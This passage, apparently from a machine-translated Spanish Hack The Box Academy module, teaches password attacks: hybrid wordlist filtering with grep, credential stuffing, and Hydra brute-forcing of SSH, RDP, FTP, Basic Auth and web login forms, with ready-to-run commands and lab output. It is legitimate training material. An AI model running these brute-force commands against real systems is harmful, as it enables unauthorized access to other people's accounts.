Desafortunadamente, una práctica generalizada e insegura entre los usuarios está haciendo modificaciones menores a sus contraseñas cuando se ven obligados a cambiarlas. Esto a menudo se manifiesta como agregar un número o un carácter especial al final de la contraseña actual. Por ejemplo, un usuario puede tener una contraseña inicial como "Summer2023" y luego, cuando se le pida que la actualice, cámbiela a "Summer2023!" o "Summer2024."

Este comportamiento predecible crea una laguna que los ataques híbridos pueden explotar sin piedad. Los atacantes capitalizan esta tendencia humana mediante el empleo de técnicas sofisticadas que combinan las fortalezas del diccionario y los ataques de fuerza bruta, lo que aumenta drásticamente la probabilidad de violaciones exitosas de contraseñas.

### Ataques Híbridos en Acción

Ilustremos esto con un ejemplo práctico. Considere un atacante dirigido a una organización conocida por hacer cumplir los cambios regulares de contraseña.

![Diagrama de flujo que muestra el proceso de ataque de contraseña: la organización objetivo utiliza contraseñas comunes y términos de la industria; el atacante realiza reconocimiento, ataque de diccionario y cuentas de usuario de orientación de fuerza bruta.](https://academy.hackthebox.com/storage/modules/57/3n.png)

El atacante comienza lanzando un ataque de diccionario, utilizando una lista de palabras curada con contraseñas comunes, términos específicos de la industria e información potencialmente personal relacionada con la organización o sus empleados. Esta fase intenta identificar rápidamente cualquier fruta de bajo rendimiento: cuentas protegidas por contraseñas débiles o fácilmente adivinables.

Sin embargo, si el ataque del diccionario no tiene éxito, el ataque híbrido pasa sin problemas a un modo de fuerza bruta. En lugar de generar aleatoriamente combinaciones de contraseñas, modifica estratégicamente las palabras de la lista de palabras original, anexando números, caracteres especiales o incluso incrementando años, como en nuestro ejemplo "Summer2023".

Este enfoque dirigido a la fuerza bruta reduce drásticamente el espacio de búsqueda en comparación con un ataque tradicional de fuerza bruta, al tiempo que cubre muchas variaciones potenciales de contraseña que los usuarios pueden emplear para cumplir con la política de cambio de contraseña.

### El Poder de los Ataques Híbridos

La efectividad de los ataques híbridos radica en su adaptabilidad y eficiencia. Aprovechan las fortalezas de las técnicas de diccionario y fuerza bruta, maximizando las posibilidades de descifrar contraseñas, especialmente en escenarios donde los usuarios caen en patrones predecibles.

Es importante tener en cuenta que los ataques híbridos no se limitan al escenario de cambio de contraseña descrito anteriormente. Se pueden adaptar para explotar cualquier patrón de contraseña observado o sospechado dentro de una organización objetivo. Consideremos un escenario en el que tiene acceso a una lista de palabras de contraseñas comunes, y está apuntando a una organización con la siguiente política de contraseñas:

- Longitud mínima: 8 caracteres
- Debe incluir:
    - Al menos una letra mayúscula
    - Al menos una letra minúscula
    - Al menos un número

Para extraer solo las contraseñas que se adhieren a esta política, podemos aprovechar las potentes herramientas de línea de comandos disponibles en la mayoría de los sistemas basados en Linux/Unix de forma predeterminada, específicamente `grep` emparejado con regex. Vamos a usar el [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) lista de contraseñas para esto. Primero, descarga la lista de palabras

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
```

A continuación, debemos comenzar a hacer coincidir esa lista de palabras con la política de contraseñas.

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```

Esta inicial `grep` el comando apunta al requisito de la política central de una longitud mínima de contraseña de 8 caracteres. La expresión regular `^.{8,}$` actúa como un filtro, asegurando que solo las contraseñas que contienen al menos 8 caracteres se pasen y guarden en un archivo temporal nombrado `darkweb2017-minlength.txt`.

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```

Sobre la base del filtro anterior, esto `grep` el comando hace cumplir la demanda de la política de al menos una letra mayúscula. La expresión regular `[A-Z]` asegura que cualquier contraseña que carezca de una letra mayúscula se descarte, refinando aún más la lista guardada `darkweb2017-uppercase.txt`.

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```

Mantener la cadena de filtrado, esto `grep` el comando garantiza el cumplimiento del requisito de la política para al menos una letra minúscula. La expresión regular `[a-z]` sirve como filtro, manteniendo solo contraseñas que incluyen al menos una letra minúscula y almacenándolas `darkweb2017-lowercase.txt`.

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```

Esto último `grep` el comando aborda el requisito numérico de la política. La expresión regular `[0-9]` actúa como un filtro, asegurando que las contraseñas que contienen al menos un dígito numérico se conservan en `darkweb2017-number.txt`.

  Ataques Híbridos

```shell-session
vcrdcr@htb[/htb]$ wc -l darkweb2017-number.txt

89 darkweb2017-number.txt
```

Como lo demuestra el resultado anterior, filtrar meticulosamente la extensa lista de 10,000 contraseñas en comparación con la política de contraseñas ha reducido drásticamente nuestras contraseñas potenciales a 89. Esta reducción drástica en el espacio de búsqueda representa un aumento significativo en la eficiencia para cualquier intento posterior de descifrado de contraseñas. Una lista más pequeña y específica se traduce en un ataque más rápido y enfocado, optimizando el uso de recursos computacionales y aumentando la probabilidad de una violación exitosa.

## Relleno de Credenciales: Aprovechando Datos Robados para Acceso No Autorizado

![Diagrama de flujo que muestra fuentes de credenciales como violaciones de datos y phishing, lo que lleva a acciones de atacantes como la adquisición de credenciales y el acceso no autorizado, lo que resulta en robo de datos y fraude de identidad.](https://academy.hackthebox.com/storage/modules/57/5n.png)

Los ataques de relleno de credenciales explotan la desafortunada realidad de que muchos usuarios reutilizan contraseñas en múltiples cuentas en línea. Esta práctica generalizada, a menudo impulsada por el deseo de conveniencia y el desafío de administrar numerosas credenciales únicas, crea un terreno fértil para que los atacantes exploten.

Es un proceso de varias etapas que comienza con los atacantes adquiriendo listas de nombres de usuario y contraseñas comprometidos. Estas listas pueden provenir de violaciones de datos a gran escala o compilarse a través de estafas de phishing y malware. En particular, listas de palabras disponibles públicamente como `rockyou` o los que se encuentran en `seclists` también puede servir como punto de partida, ofreciendo a los atacantes un tesoro de contraseñas de uso común.

Una vez armados con estas credenciales, los atacantes identifican objetivos potenciales: servicios en línea probablemente utilizados por las personas cuya información poseen. Las redes sociales, los proveedores de correo electrónico, la banca en línea y los sitios de comercio electrónico son objetivos principales debido a los datos confidenciales que a menudo tienen.

El ataque luego cambia a una fase automatizada. Los atacantes usan herramientas o scripts para probar sistemáticamente las credenciales robadas contra los objetivos elegidos, a menudo imitando el comportamiento normal del usuario para evitar la detección. Esto les permite probar rápidamente un gran número de credenciales, aumentando sus posibilidades de encontrar una coincidencia.

Un partido exitoso otorga acceso no autorizado, abriendo la puerta a diversas actividades maliciosas, desde robo de datos y fraude de identidad hasta delitos financieros. La cuenta comprometida puede ser una plataforma de lanzamiento para nuevos ataques, propagación de malware o infiltración de sistemas conectados.

### El Problema de Reutilización de Contraseña

El problema central que alimenta el éxito del relleno de credenciales es la práctica generalizada de la reutilización de contraseñas. Cuando los usuarios confían en las mismas contraseñas o similares para varias cuentas, una violación en una plataforma puede tener un efecto dominó, comprometiendo muchas otras cuentas. Esto pone de relieve la necesidad urgente de contraseñas sólidas y únicas para cada servicio en línea, junto con medidas de seguridad proactivas como la autenticación multifactor.


# Hydra

---

Hydra es un cracker de inicio de sesión de red rápido que admite numerosos protocolos de ataque. Es una herramienta versátil que puede forzar una amplia gama de servicios, incluidas aplicaciones web, servicios de inicio de sesión remoto como SSH y FTP, e incluso bases de datos.

La popularidad de Hydra proviene de su:

- `Speed and Efficiency`: Hydra utiliza conexiones paralelas para realizar múltiples intentos de inicio de sesión simultáneamente, acelerando significativamente el proceso de craqueo.
- `Flexibility`: Hydra admite muchos protocolos y servicios, lo que lo hace adaptable a varios escenarios de ataque.
- `Ease of Use`: Hydra es relativamente fácil de usar a pesar de su potencia, con una interfaz de línea de comandos sencilla y una sintaxis clara.

### Instalación

Hydra a menudo viene preinstalado en distribuciones populares de pruebas de penetración. Puede verificar su presencia ejecutando:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -h
```

Si Hydra no está instalado o está utilizando una distribución de Linux diferente, puede instalarlo desde el repositorio de paquetes:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ sudo apt-get -y update
vcrdcr@htb[/htb]$ sudo apt-get -y install hydra 
```

## Uso Básico

La sintaxis básica de Hydra es:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra [login_options] [password_options] [attack_options] [service_options]
```

|Parámetro|Explicación|Ejemplo de Uso|
|---|---|---|
|`-l LOGIN`o `-L FILE`|Opciones de inicio de sesión: Especifique un solo nombre de usuario (`-l`) o un archivo que contiene una lista de nombres de usuario (`-L`).|`hydra -l admin ...`o `hydra -L usernames.txt ...`|
|`-p PASS`o `-P FILE`|Opciones de contraseña: Proporcione una sola contraseña (`-p`) o un archivo que contiene una lista de contraseñas (`-P`).|`hydra -p password123 ...`o `hydra -P passwords.txt ...`|
|`-t TASKS`|Tareas: Defina el número de tareas paralelas (hilos) a ejecutar, lo que podría acelerar el ataque.|`hydra -t 4 ...`|
|`-f`|Modo rápido: Detenga el ataque después de encontrar el primer inicio de sesión exitoso.|`hydra -f ...`|
|`-s PORT`|Puerto: Especifique un puerto no predeterminado para el servicio de destino.|`hydra -s 2222 ...`|
|`-v`o `-V`|Salida verbose: Mostrar información detallada sobre el progreso del ataque, incluyendo intentos y resultados.|`hydra -v ...` o `hydra -V ...` (para aún más verbosidad)|
|`service://server`|Objetivo: Especificar el servicio (por ejemplo, `ssh`, `http`, `ftp`) y la dirección o el nombre de host del servidor de destino.|`hydra ssh://192.168.1.100`|
|`/OPT`|Opciones específicas del servicio: Proporcione cualquier opción adicional requerida por el servicio de destino.|`hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"`(para la autenticación basada en formularios HTTP)|

### Servicios Hydra

Los servicios de Hydra definen esencialmente los protocolos o servicios específicos a los que Hydra puede dirigirse. Permiten a Hydra interactuar con diferentes mecanismos de autenticación utilizados por varios sistemas, aplicaciones y servicios de red. Cada módulo está diseñado para comprender los patrones de comunicación y los requisitos de autenticación de un protocolo en particular, lo que permite a Hydra enviar solicitudes de inicio de sesión apropiadas e interpretar las respuestas. A continuación se muestra una tabla de servicios de uso común:

|Servicio Hydra|Servicio/Protocolo|Descripción|Ejemplo Comando|
|---|---|---|---|
|ftp|Protocolo de Transferencia de Archivos (FTP)|Se utiliza para credenciales de inicio de sesión de fuerza bruta para servicios FTP, comúnmente utilizados para transferir archivos a través de una red.|`hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`|
|ssh|Shell Seguro (SSH)|Apunta los servicios SSH a credenciales de fuerza bruta, comúnmente utilizadas para el inicio de sesión remoto seguro en sistemas.|`hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`|
|http-get/publicación|Servicios Web HTTP|Se utiliza para credenciales de inicio de sesión de fuerza bruta para formularios de inicio de sesión web HTTP utilizando solicitudes GET o POST.|`hydra -l admin -P /path/to/password_list.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"`|
|smtp|Protocolo Simple de Transferencia de Correo|Ataca a los servidores de correo electrónico mediante credenciales de inicio de sesión de fuerza bruta para SMTP, comúnmente utilizadas para enviar correos electrónicos.|`hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`|
|pop3|Protocolo de la Oficina de Correos (POP3)|Apunta los servicios de recuperación de correo electrónico a las credenciales de fuerza bruta para el inicio de sesión POP3.|`hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`|
|imap|Protocolo de Acceso a Mensajes de Internet|Se utiliza para credenciales de fuerza bruta para servicios IMAP, que permiten a los usuarios acceder a su correo electrónico de forma remota.|`hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`|
|mysql|Base de datos MySQL|Intentos de credenciales de inicio de sesión de fuerza bruta para bases de datos MySQL.|`hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`|
|mssql|Microsoft SQL Server|Apunta a los servidores SQL de Microsoft a las credenciales de inicio de sesión de base de datos de fuerza bruta.|`hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`|
|vnc|Computación de Red Virtual (VNC)|Servicios VNC de fuerzas brutas, utilizados para el acceso de escritorio remoto.|`hydra -P /path/to/password_list.txt vnc://192.168.1.100`|
|rdp|Protocolo de Escritorio Remoto (RDP)|Apunta a los servicios RDP de Microsoft para el inicio de sesión remoto de fuerza bruta.|`hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`|

### Autenticación HTTP de Fuerza Bruta

Imagine que tiene la tarea de probar la seguridad de un sitio web utilizando la autenticación HTTP básica en `www.example.com`. Tiene una lista de nombres de usuario potenciales almacenados en `usernames.txt` y las contraseñas correspondientes en `passwords.txt`. Para lanzar un ataque de fuerza bruta contra este servicio HTTP, utilice el siguiente comando Hydra:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```

Este comando instruye a Hydra a:

- Utilice la lista de nombres de usuario de la `usernames.txt` archivo.
- Utilice la lista de contraseñas de la `passwords.txt` archivo.
- Dirigirse al sitio web `www.example.com`.
- Emplear el `http-get` módulo para probar la autenticación HTTP.

Hydra probará sistemáticamente cada combinación de nombre de usuario y contraseña contra el sitio web de destino para descubrir un inicio de sesión válido.

### Orientación a Múltiples Servidores SSH

Considere una situación en la que haya identificado varios servidores que pueden ser vulnerables a los ataques de fuerza bruta SSH. Compila sus direcciones IP en un archivo llamado `targets.txt` y sepa que estos servidores pueden usar el nombre de usuario predeterminado "root" y la contraseña "toor." Para probar de manera eficiente todos estos servidores simultáneamente, use el siguiente comando Hydra:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -l root -p toor -M targets.txt ssh
```

Este comando instruye a Hydra a:

- Usa el nombre de usuario "root".
- Utilice la contraseña "toor".
- Apunte a todas las direcciones IP enumeradas en el `targets.txt` archivo.
- Emplear el `ssh` módulo para el ataque.

Hydra ejecutará intentos paralelos de fuerza bruta en cada servidor, acelerando significativamente el proceso.

### Prueba de Credenciales FTP en un Puerto No Estándar

Imagine que necesita evaluar la seguridad de un servidor FTP alojado en `ftp.example.com`, que opera en un puerto no estándar `2121`. Tiene listas de posibles nombres de usuario y contraseñas almacenadas en `usernames.txt` y `passwords.txt`, respectivamente. Para probar estas credenciales contra el servicio FTP, utilice el siguiente comando Hydra:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

Este comando instruye a Hydra a:

- Utilice la lista de nombres de usuario de la `usernames.txt` archivo.
- Utilice la lista de contraseñas de la `passwords.txt` archivo.
- Apunte al servicio FTP en `ftp.example.com` vía puerto `2121`.
- Usa el `ftp` módulo y proporcionar salida detallada (`-V`) para un seguimiento detallado.

Hydra intentará hacer coincidir cada combinación de nombre de usuario y contraseña con el servidor FTP en el puerto especificado.

### Brute-Forcing un Formulario de Inicio de Sesión Web

Supongamos que tiene la tarea de forzar brutamente un formulario de inicio de sesión en una aplicación web en `www.example.com`. Usted sabe que el nombre de usuario es "admin", y los parámetros del formulario para el inicio de sesión son `user=^USER^&pass=^PASS^`. Para realizar este ataque, utilice el siguiente comando Hydra:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

Este comando instruye a Hydra a:

- Utilice el nombre de usuario "admin".
- Utilice la lista de contraseñas de la `passwords.txt` archivo.
- Apunte al formulario de inicio de sesión en `/login` en `www.example.com`.
- Emplear el `http-post-form` módulo con los parámetros de formulario especificados.
- Busque un inicio de sesión exitoso indicado por el código de estado HTTP `302`.

Hydra intentará sistemáticamente cada contraseña para la cuenta "admin", verificando la condición de éxito especificada.

### Avanzado RDP Brute-Fuerza

Ahora, imagine que está probando un servicio de Protocolo de Escritorio remoto (RDP) en un servidor con IP `192.168.1.100`. Sospechas que el nombre de usuario es "administrador" y que la contraseña consta de 6 a 8 caracteres, incluidas letras minúsculas, letras mayúsculas y números. Para llevar a cabo este ataque preciso, utilice el siguiente comando Hydra:

  Hidra

```shell-session
vcrdcr@htb[/htb]$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```

Este comando instruye a Hydra a:

- Utilice el nombre de usuario "administrador".
- Genere y pruebe contraseñas que van de 6 a 8 caracteres, utilizando el conjunto de caracteres especificado.
- Apunte al servicio RDP en `192.168.1.100`.
- Emplear el `rdp` módulo para el ataque.

Hydra generará y probará todas las combinaciones de contraseñas posibles dentro de los parámetros especificados, intentando entrar en el servicio RDP.

[Anterior](https://academy.hackthebox.com/module/57/section/489)


# Autenticación HTTP Básica

Las aplicaciones web a menudo emplean mecanismos de autenticación para proteger datos y funcionalidades confidenciales. Autenticación HTTP básica, o simplemente `Basic Auth`, es un método rudimentario pero común para asegurar recursos en la web. Aunque es fácil de implementar, sus vulnerabilidades de seguridad inherentes lo convierten en un objetivo frecuente para los ataques de fuerza bruta.

En esencia, Basic Auth es un protocolo de respuesta a desafíos en el que un servidor web exige credenciales de usuario antes de otorgar acceso a recursos protegidos. El proceso comienza cuando un usuario intenta acceder a un área restringida. El servidor responde con un `401 Unauthorized` estado y a `WWW-Authenticate` encabezado que solicita al navegador del usuario que presente un cuadro de diálogo de inicio de sesión.

Una vez que el usuario proporciona su nombre de usuario y contraseña, el navegador los concatena en una sola cadena, separados por dos puntos. Esta cadena se codifica entonces usando Base64 y se incluye en el `Authorization` encabezado de solicitudes posteriores, siguiendo el formato `Basic <encoded_credentials>`. El servidor decodifica las credenciales, las verifica contra su base de datos y otorga o niega el acceso en consecuencia.

Por ejemplo, los encabezados de Basic Auth en una solicitud HTTP GET se verían como:

Código: http

```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## Explotando la Autenticación Básica con Hydra

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

Usaremos el `http-get` servicio Hydra para forzar brutamente el objetivo básico de autenticación.

En este escenario, la instancia de destino generada emplea Autenticación HTTP Básica. Ya sabemos que el nombre de usuario es `basic-auth-user`. Como conocemos el nombre de usuario, podemos simplificar el comando Hydra y centrarnos únicamente en forzar la contraseña. Aquí está el comando que usaremos:

  Autenticación HTTP Básica

```shell-session
# Download wordlist if needed
vcrdcr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
# Hydra command
vcrdcr@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

Desglosemos el comando:

- `-l basic-auth-user`: Esto especifica que el nombre de usuario para el intento de inicio de sesión es 'basic-auth-user'.
- `-P 2023-200_most_used_passwords.txt`: Esto indica que Hydra debe usar la lista de contraseñas contenida en el archivo '2023-200_most_used_passwords.txt' para su ataque de fuerza bruta.
- `127.0.0.1`: Esta es la dirección IP de destino, en este caso, la máquina local (localhost).
- `http-get /`: Esto le dice a Hydra que el servicio de destino es un servidor HTTP y el ataque debe realizarse utilizando solicitudes HTTP GET a la ruta raíz ('/').
- `-s 81`: Esto anula el puerto predeterminado para el servicio HTTP y lo establece en 81.

Tras la ejecución, Hydra intentará sistemáticamente cada contraseña del `2023-200_most_used_passwords.txt` archivar contra el recurso especificado. Eventualmente devolverá la contraseña correcta para `basic-auth-user`, que puede utilizar para iniciar sesión en el sitio web y recuperar la bandera.


# Formularios de Inicio de Sesión

Más allá del ámbito de la Autenticación HTTP básica, muchas aplicaciones web emplean formularios de inicio de sesión personalizados como su mecanismo de autenticación principal. Estas formas, aunque visualmente diversas, a menudo comparten una mecánica subyacente común que las convierte en objetivos para el forzamiento bruto.

## Comprender los Formularios de Inicio de Sesión

Si bien los formularios de inicio de sesión pueden aparecer como cuadros simples que solicitan su nombre de usuario y contraseña, representan una interacción compleja de las tecnologías del lado del cliente y del lado del servidor. En esencia, los formularios de inicio de sesión son esencialmente formularios HTML incrustados dentro de una página web. Estos formularios incluyen típicamente campos de entrada (`<input>`) para capturar el nombre de usuario y la contraseña, junto con un botón de envío (`<button>` o `<input type="submit">`) para iniciar el proceso de autenticación.

## Un Ejemplo de Formulario de Inicio de Sesión Básico

La mayoría de los formularios de inicio de sesión siguen una estructura similar. Aquí hay un ejemplo:

Código: html

```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```

Este formulario, cuando se envía, envía una solicitud POST al `/login` punto final en el servidor, incluido el nombre de usuario y la contraseña ingresados como datos del formulario.

Código: http

```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```

- El `POST` el método indica que los datos se envían al servidor para crear o actualizar un recurso.
- `/login`es el punto final de URL que maneja la solicitud de inicio de sesión.
- El `Content-Type` el encabezado especifica cómo se codifican los datos en el cuerpo de solicitud.
- El `Content-Length` el encabezado indica el tamaño de los datos que se envían.
- El cuerpo de solicitud contiene el nombre de usuario y la contraseña, codificados como pares clave-valor.

Cuando un usuario interactúa con un formulario de inicio de sesión, su navegador maneja el procesamiento inicial. El navegador captura las credenciales ingresadas, a menudo empleando JavaScript para la validación del lado del cliente o la desinfección de entradas. Tras el envío, el navegador construye una solicitud HTTP POST. Esta solicitud encapsula la data— del formulario, incluido el nombre de usuario y la contraseña— dentro de su cuerpo, a menudo codificados como `application/x-www-form-urlencoded` o `multipart/form-data`.

## http-post-forma

**Para seguir, inicie el sistema de destino a través de la sección de preguntas en la parte inferior de la página.**

Hydra's `http-post-form` el servicio está diseñado específicamente para orientar los formularios de inicio de sesión. Permite la automatización de las solicitudes POST, insertando dinámicamente combinaciones de nombre de usuario y contraseña en el cuerpo de la solicitud. Al aprovechar las capacidades de Hydra, los atacantes pueden probar de manera eficiente numerosas combinaciones de credenciales contra un formulario de inicio de sesión, lo que podría descubrir inicios de sesión válidos.

La estructura general de un comando Hydra usando `http-post-form` se ve así:

  Formularios de Inicio de Sesión

```shell-session
vcrdcr@htb[/htb]$ hydra [options] target http-post-form "path:params:condition_string"
```

### Comprender la Cadena de Condición

En Hydraraws `http-post-form` las condiciones de módulo, éxito y falla son cruciales para identificar adecuadamente los intentos de inicio de sesión válidos e inválidos. Hydra se basa principalmente en las condiciones de falla (`F=...`) para determinar cuándo ha fallado un intento de inicio de sesión, pero también puede especificar una condición de éxito (`S=...`) para indicar cuándo un inicio de sesión es exitoso.

La condición de falla (`F=...`) se utiliza para verificar si hay una cadena específica en la respuesta del servidor que indique un intento fallido de inicio de sesión. Este es el enfoque más común porque muchos sitios web devuelven un mensaje de error (como "Nombre de usuario o contraseña no válidos") cuando falla el inicio de sesión. Por ejemplo, si un formulario de inicio de sesión devuelve el mensaje "Credenciales no válidas" en un intento fallido, puede configurar Hydra de esta manera:

Código: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```

En este caso, Hydra verificará cada respuesta para la cadena "Gerencias no válidas." Si encuentra esta frase, marcará el intento de inicio de sesión como un error y pasará al siguiente par de nombre de usuario/contraseña. Este enfoque se usa comúnmente porque los mensajes de falla suelen ser fáciles de identificar.

Sin embargo, a veces es posible que no tenga un mensaje de falla claro, sino que tenga una condición de éxito distinta. Por ejemplo, si la aplicación redirige al usuario después de un inicio de sesión exitoso (usando código de estado HTTP `302`), o muestra contenido específico (como "Dashboard" o "Bienvenido"), puede configurar Hydra para buscar esa condición de éxito usando `S=`. Aquí hay un ejemplo en el que un inicio de sesión exitoso da como resultado una redirección 302:

Código: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```

En este caso, Hydra tratará cualquier respuesta que devuelva un código de estado HTTP 302 como un inicio de sesión exitoso. Del mismo modo, si un inicio de sesión exitoso da como resultado contenido como "Dashboard" que aparece en la página, puede configurar Hydra para buscar esa palabra clave como condición de éxito:

Código: bash

```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```

Hydra ahora registrará el inicio de sesión como exitoso si encuentra la palabra "Dashboard" en la respuesta de las servidores.

Antes de desatar Hydra en un formulario de inicio de sesión, es esencial recopilar inteligencia sobre su funcionamiento interno. Esto implica identificar los parámetros exactos que utiliza el formulario para transmitir el nombre de usuario y la contraseña al servidor.

### Inspección Manual

Al acceder al `IP:PORT` en su navegador, se presenta un formulario de inicio de sesión básico. Usando las herramientas de desarrollador de su navegador (típicamente haciendo clic derecho y seleccionando "Inspect" o una opción similar), puede ver el código HTML subyacente para este formulario. Desglosemos sus componentes clave:

Código: html

```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```

El HTML revela un formulario de inicio de sesión simple. Puntos clave para Hydra:

- `Method`: `POST` - Hydra tendrá que enviar solicitudes POST al servidor.
- Campos:
    - `Username`: El campo de entrada nombrado `username` serán atacados.
    - `Password`: El campo de entrada nombrado `password` serán atacados.

Con estos detalles, puede construir el comando Hydra para automatizar el ataque de fuerza bruta contra este formulario de inicio de sesión.

### Herramientas de Desarrollador del Navegador

Después de inspeccionar el formulario, abra las Herramientas de desarrollo de su navegador (F12) y navegue a la pestaña "Red". Envíe un intento de inicio de sesión de muestra con cualquier credencial. Esto le permitirá ver la solicitud POST enviada al servidor. En la pestaña "Red", busque la solicitud correspondiente al envío del formulario y verifique los datos del formulario, los encabezados y la respuesta de las direcciones de servidor.

![Formulario de inicio de sesión con error de credenciales no válido y panel de red que muestra los detalles de la solicitud HTTP POST.](https://academy.hackthebox.com/storage/modules/57/devtools.png)

Esta información solidifica aún más la información que necesitaremos para Hydra. Ahora tenemos una confirmación definitiva de la ruta de destino (`/`) y los nombres de los parámetros (`username` y `password`).

### Intercepción de Proxy

Para escenarios más complejos, interceptar el tráfico de red con una herramienta proxy como Burp Suite o OWASP ZAP puede ser invaluable. Configure su navegador para enrutar su tráfico a través del proxy y luego interactúe con el formulario de inicio de sesión. El proxy capturará la solicitud POST, lo que le permitirá diseccionar todos sus componentes, incluidos los parámetros de inicio de sesión precisos y sus valores.

## Construyendo la cadena de params para Hydra

Después de analizar la estructura y el comportamiento del formulario de inicio de sesión, es hora de construir el `params` string, un componente crítico de Hydra `http-post-form` módulo de ataque. Esta cadena encapsula los datos que se enviarán al servidor con cada intento de inicio de sesión, imitando un envío de formulario legítimo.

El `params` la cadena consiste en pares clave-valor, similar a cómo se codifican los datos en una solicitud POST. Cada par representa un campo en el formulario de inicio de sesión, con su valor correspondiente.

- `Form Parameters`: Estos son los campos esenciales que contienen el nombre de usuario y la contraseña. Hydra reemplazará dinámicamente los marcadores de posición (`^USER^` y `^PASS^`) dentro de estos parámetros con valores de sus listas de palabras.
- `Additional Fields`: Si el formulario incluye otros campos ocultos o tokens (por ejemplo, tokens CSRF), también deben incluirse en el `params` cuerda. Estos pueden tener valores estáticos o marcadores de posición dinámicos si sus valores cambian con cada solicitud.
- `Success Condition`: Esto define los criterios que Hydra utilizará para identificar un inicio de sesión exitoso. Puede ser un código de estado HTTP (como `S=302` para una redirección) o la presencia o ausencia de texto específico en la respuesta del servidor (por ejemplo `F=Invalid credentials` o `S=Welcome`).

Apliquemos esto a nuestro escenario. Hemos descubierto:

- El formulario envía datos a la ruta raíz (`/`).
- El campo de nombre de usuario se nombra `username`.
- El campo de contraseña se nombra `password`.
- Se muestra un mensaje de error "Credenciales no válidas" al iniciar sesión fallido.

Por lo tanto, nuestro `params` la cuerda sería:

Código: bash

```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```

- `"/"`: La ruta donde se envía el formulario.
- `username=^USER^&password=^PASS^`: Los parámetros de formulario con marcadores de posición para Hydra.
- `F=Invalid credentials`: La condición de falla – Hydra considerará que un intento de inicio de sesión no tiene éxito si ve esta cadena en la respuesta.

Estaremos usando [top-nombres-shortlist.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) para la lista de nombres de usuario, y [2023-200_most_used_contraseñas.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) para la lista de contraseñas.

Esto `params` la cadena se incorpora en el comando Hydra de la siguiente manera. Hydra sustituirá sistemáticamente `^USER^` y `^PASS^` con valores de sus listas de palabras, envíe solicitudes POST al objetivo y analice las respuestas para la condición de falla especificada. Si un intento de inicio de sesión no activa el mensaje "Credenciales no válidas", Hydra lo marcará como un éxito potencial, revelando las credenciales válidas.

  Formularios de Inicio de Sesión

```shell-session
# Download wordlists if needed
vcrdcr@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
